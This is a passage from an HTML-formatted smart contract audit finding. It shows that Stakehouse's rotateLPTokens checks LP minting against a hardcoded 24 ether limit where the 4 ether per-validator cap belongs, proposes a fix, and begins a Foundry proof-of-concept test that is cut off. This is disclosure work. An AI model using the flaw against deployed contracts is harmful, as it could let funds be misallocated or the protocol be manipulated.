class=\"mtk1\">, </span><span class=\"mtk8\">&quot;DAO staking funds vault balance must be at least 4 ether&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>however, user can call the function rotateLPTokens to mint more than 4 ETHER of the stakingFundsLP because of the incorrect implementation of the ETHPoolLPFactory.sol#rotateLPTokens</p>\n<p>note that stakingFundVault inherits from ETHPoolFactory.sol</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"90\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">StakingFundsVault</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">Initializable</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ITransferHookProcessor</span><span class=\"mtk1\">, </span><span class=\"mtk12\">StakehouseAPI</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ETHPoolLPFactory</span><span class=\"mtk1\">,</span></span></span></code></pre>\n<p>so user call rotateLPTokens on StakingFundsVault</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"91\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @notice Allow users to rotate the ETH from one LP token to another in the event that the BLS key is never staked</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @param _oldLPToken Instance of the old LP token (to be burnt)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @param _newLPToken Instane of the new LP token (to be minted)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @param _amount Amount of LP tokens to be rotated/converted from old to new</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">rotateLPTokens</span><span class=\"mtk1\">(</span><span class=\"mtk12\">LPToken</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_oldLPToken</span><span class=\"mtk1\">, </span><span class=\"mtk12\">LPToken</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_newLPToken</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_oldLPToken</span><span class=\"mtk1\">) != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;Zero address&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_newLPToken</span><span class=\"mtk1\">) != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;Zero address&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_oldLPToken</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">_newLPToken</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Incorrect rotation to same token&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">MIN_STAKING_AMOUNT</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Amount cannot be zero&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">_oldLPToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;Not enough balance&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_oldLPToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">lastInteractedTimestamp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">) + </span><span class=\"mtk7\">30</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minutes</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Liquidity is still fresh&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">_newLPToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">() &lt;= </span><span class=\"mtk7\">24</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Not enough mintable tokens&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>note the line:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"92\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">_newLPToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">() &lt;= </span><span class=\"mtk7\">24</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Not enough mintable tokens&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>the correct implementaton should be:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"93\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">_newLPToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">() &lt;= </span><span class=\"mtk12\">maxStakingAmountPerValidator</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Not enough mintable tokens&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>The 24 ETH is hardcoded, but when the stakingFundsVault.sol is init, the maxStakingAmountPerValidator is set to 4 ETH.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"94\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @dev Initialization logic</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_init</span><span class=\"mtk1\">(</span><span class=\"mtk12\">LiquidStakingManager</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_liquidStakingNetworkManager</span><span class=\"mtk1\">, </span><span class=\"mtk12\">LPTokenFactory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_lpTokenFactory</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_liquidStakingNetworkManager</span><span class=\"mtk1\">) != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;Zero Address&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_lpTokenFactory</span><span class=\"mtk1\">) != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;Zero Address&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">liquidStakingNetworkManager</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_liquidStakingNetworkManager</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">lpTokenFactory</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_lpTokenFactory</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">baseLPTokenName</span><span class=\"mtk1\"> = </span><span class=\"mtk8\">&quot;ETHLPToken_&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">baseLPTokenSymbol</span><span class=\"mtk1\"> = </span><span class=\"mtk8\">&quot;ETHLP_&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">maxStakingAmountPerValidator</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>note the line:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"95\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">maxStakingAmountPerValidator</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>this parameter maxStakingAmountPerValidator restrict user’s ETH deposit amount</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"96\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @dev Internal business logic for processing staking deposits for single or batch deposits</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_depositETHForStaking</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_blsPublicKeyOfKnot</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_enableTransferHook</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">MIN_STAKING_AMOUNT</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Min amount not reached&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_blsPublicKeyOfKnot</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">48</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Invalid BLS public key&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk3\">// LP token issued for the KNOT</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk3\">// will be zero for a new KNOT because the mapping doesn&#39;t exist</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">LPToken</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lpToken</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">lpTokenForKnot</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_blsPublicKeyOfKnot</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk15\">if</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lpToken</span><span class=\"mtk1\">) != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk3\">// KNOT and it&#39;s LP token is already registered</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk3\">// mint the respective LP tokens for the user</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk3\">// total supply after minting the LP token must not exceed maximum staking amount per validator</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lpToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">() + </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">maxStakingAmountPerValidator</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Amount exceeds the staking limit for the validator&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk3\">// mint LP tokens for the depoistor with 1:1 ratio of LP tokens and ETH supplied</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">lpToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">LPTokenMinted</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_blsPublicKeyOfKnot</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lpToken</span><span class=\"mtk1\">), </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk3\">// check that amount doesn&#39;t exceed max staking amount per validator</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">maxStakingAmountPerValidator</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Amount exceeds the staking limit for the validator&quot;</span><span class=\"mtk1\">);  </span></span></span></code></pre>\n<p>note the line:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"97\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">maxStakingAmountPerValidator</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Amount exceeds the staking limit for the validator&quot;</span><span class=\"mtk1\">); </span></span></span></code></pre>\n<p>However, such restriction when rotating LP is changed to</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"98\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">_newLPToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">() &lt;= </span><span class=\"mtk7\">24</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Not enough mintable tokens&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><strong>So to sum it up:</strong></p>\n<p>When user stakes, the code strictly requires the stakingFundVault LP total supply is equal to 4 ETH:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"99\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stakingFundsLP</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">() == </span><span class=\"mtk7\">4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;DAO staking funds vault balance must be at least 4 ether&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>However, when rotating the LP, the maxStakingAmountPerValidator for staking fund LP becomes 24 ETH, which exceeds 4 ETH (the expected maxStakingAmountPerValidator)</p>\n<h3 id=\"proof-of-concept-29\" style=\"position:relative;\"><a href=\"#proof-of-concept-29\" aria-label=\"proof of concept 29 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>First we need to add the import in LiquidStakingManager.t.sol</p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L12\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L12</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"100\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">MockAccountManager</span><span class=\"mtk1\"> } </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../../contracts/testing/stakehouse/MockAccountManager.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../../contracts/liquid-staking/StakingFundsVault.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../../contracts/liquid-staking/LPToken.sol&quot;</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L35\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L35</a></p>\n<p><strong>then we add the POC:</strong></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"101\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_rotateLP_Exceed_maxStakingAmountPerValidator_POC</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">user</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addr</span><span class=\"mtk1\">(</span><span class=\"mtk7\">21312</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">blsPubKeyOne</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">fromHex</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;94fdc9a61a34eb6a034e343f20732456443a2ed6668ede04677adc1e15d2a24500a3e05cf7ad3dc3b2f3cc13fdc12af5&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">blsPubKeyTwo</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">fromHex</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;9AAdc9a61a34eb6a034e343f20732456443a2ed6668ede04677adc1e15d2a24500a3e05cf7ad3dc3b2f3cc13fdc12af5&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">publicKeys</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">bytes</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">publicKeys</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">blsPubKeyOne</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">publicKeys</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">blsPubKeyTwo</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">signature</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">bytes</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">signature</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk8\">&quot;signature&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">signature</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">] = </span><span class=\"mtk8\">&quot;signature&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk3\">// user spends 8 ether and register two keys to become the public operator</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">, </span><span class=\"mtk7\">8</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">manager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">registerBLSPublicKeys</span><span class=\"mtk1\">{value: </span><span class=\"mtk7\">8</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">}(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">publicKeys</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">signature</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">user</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk3\">// active two 